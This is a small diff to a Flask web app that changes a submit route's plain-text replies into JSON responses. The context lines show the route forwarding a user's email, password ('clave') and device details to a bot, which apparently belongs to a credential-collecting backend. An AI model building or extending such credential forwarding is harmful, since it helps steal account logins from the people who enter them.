@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, redirect, url_for
+from flask import Flask, render_template, request, redirect, url_for,jsonify
 import requests
 import os
 
@@ -78,9 +78,9 @@ def submit():
     if send_details_to_bot(num, user_id, email, clave, dispositivo):
         # Marcar el mensaje como enviado
         sent_messages[(num, user_id)] = True
-        return "Detalles enviados correctamente. El usuario ha sido notificado."
+        return jsonify({"status": "success", "message": "Detalles enviados correctamente. El usuario ha sido notificado."})
     else:
-        return "Hubo un error al enviar los detalles."
+        return jsonify({"status": "error", "message": "Hubo un error al enviar los detalles."})
 
 
 
